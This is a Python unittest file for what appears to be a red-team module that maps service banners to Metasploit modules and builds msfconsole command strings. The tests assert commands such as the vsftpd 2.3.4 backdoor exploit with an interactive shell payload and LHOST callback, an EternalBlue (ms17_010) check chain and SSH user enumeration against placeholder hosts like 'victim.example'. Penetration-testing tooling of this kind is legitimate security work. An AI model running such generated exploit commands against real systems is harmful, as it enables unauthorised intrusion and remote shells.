import os
import sys
import unittest

os.environ.setdefault("ATTACK_SURFACE_NO_AUTOTERM", "1")
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


class TestMSFMap(unittest.TestCase):
    """Service/version banner → Metasploit check-then-payload mapping."""

    def test_parse_banner(self):
        from modules.redteam.msf_map import parse_banner
        self.assertEqual(parse_banner({"service_versioned": "ftp — vsftpd 2.3.4"}),
                         ("vsftpd", "2.3.4"))
        self.assertEqual(parse_banner({"banner": "OpenSSH 8.9p1 Ubuntu"}),
                         ("openssh", "8.9"))
        self.assertEqual(parse_banner({"service": "ssh?"}), ("ssh", ""))
        self.assertEqual(parse_banner({}), ("", ""))

    def test_vsftpd_234_gets_backdoor_exploit(self):
        from modules.redteam.msf_map import match_module
        e = match_module("vsftpd", "2.3.4")
        self.assertIsNotNone(e)
        self.assertEqual(e["module"], "exploit/unix/ftp/vsftpd_234_backdoor")
        self.assertEqual(e["stage"], "exploit")
        self.assertEqual(e["risk"], 10)

    def test_vsftpd_other_version_gets_check_only(self):
        from modules.redteam.msf_map import match_module
        e = match_module("vsftpd", "3.0.3")
        self.assertIsNotNone(e)
        self.assertEqual(e["stage"], "check")

    def test_openssh_old_gets_userenum_exploit(self):
        from modules.redteam.msf_map import match_module
        e = match_module("openssh", "7.2")
        self.assertEqual(e["stage"], "exploit")
        self.assertIn("openssh_userenum", e["module"])
        # modern ssh → check only
        e2 = match_module("openssh", "9.6")
        self.assertEqual(e2["stage"], "check")

    def test_smb_maps_to_eternalblue_chain(self):
        from modules.redteam.msf_map import match_module
        e = match_module("microsoft-ds", "")
        self.assertIsNotNone(e)
        # check module must come first in map order for smb
        self.assertEqual(e["stage"], "check")
        self.assertIn("ms17_010", e["module"])

    def test_unknown_service_no_match(self):
        from modules.redteam.msf_map import match_module
        self.assertIsNone(match_module("unbound", "1.13.1"))

    def test_build_cmd_check_stage(self):
        from modules.redteam.msf_map import build_cmd
        cmd = build_cmd("auxiliary/scanner/ftp/ftp_version", "t.example",
                        "linux", lhost="10.0.0.5", stage="check")
        self.assertIn("msfconsole -q -x", cmd)
        self.assertIn("use auxiliary/scanner/ftp/ftp_version", cmd)
        self.assertIn("set RHOSTS t.example", cmd)
        self.assertIn("run", cmd)
        self.assertNotIn("set PAYLOAD", cmd)  # checks don't set payloads

    def test_build_cmd_exploit_sets_payload_and_lhost(self):
        from modules.redteam.msf_map import build_cmd
        cmd = build_cmd("exploit/unix/ftp/vsftpd_234_backdoor", "t.example",
                        "unix", lhost="10.0.0.5", stage="exploit")
        self.assertIn("set PAYLOAD cmd/unix/interact", cmd)
        self.assertIn("set LHOST 10.0.0.5", cmd)
        self.assertIn("check", cmd)          # verify before firing
        self.assertIn("run -j", cmd)

    def test_map_host_ports_end_to_end(self):
        from modules.redteam.msf_map import map_host_ports
        out = map_host_ports("victim.example", [
            {"port": 21, "service": "ftp", "service_versioned": "ftp — vsftpd 2.3.4"},
            {"port": 22, "service": "ssh", "service_versioned": "ssh — OpenSSH 8.9"},
            {"port": 53, "service": "domain", "service_versioned": "domain — Unbound"},
        ])
        modules = [s["module"] for s in out]
        self.assertIn("exploit/unix/ftp/vsftpd_234_backdoor", modules)
        self.assertIn("auxiliary/scanner/ssh/ssh_enumusers", modules)
        # unbound must NOT appear
        self.assertFalse(any("unbound" in m for m in modules))
        for s in out:
            self.assertIn("msfconsole -q -x", s["cmd"])
            self.assertTrue(s["lhost"])

    def test_map_hosts_from_db_shape(self):
        """Runner passes alive_hosts + ctx.ports dict shape."""
        from modules.redteam.msf_map import map_hosts
        alive = [{"domain": "victim.example", "ip": "203.0.113.9"}]
        ports = {"victim.example": {"open_ports": [
            {"port": 3306, "service": "mysql", "service_versioned": "mysql — MariaDB 10.6"}]}}
        out = map_hosts(alive, ports)
        self.assertEqual(len(out), 1)
        self.assertIn("mysql_version", out[0]["module"])
        self.assertEqual(out[0]["stage"], "check")

    def test_dashboard_has_msf_tab(self):
        from modules.dashboard import _HTML
        self.assertIn("tab-msf", _HTML)
        self.assertIn("tb-msf", _HTML)
        self.assertIn("MSF Exploits", _HTML)
        self.assertIn("msf_suggestions", _HTML)


if __name__ == "__main__":
    unittest.main()
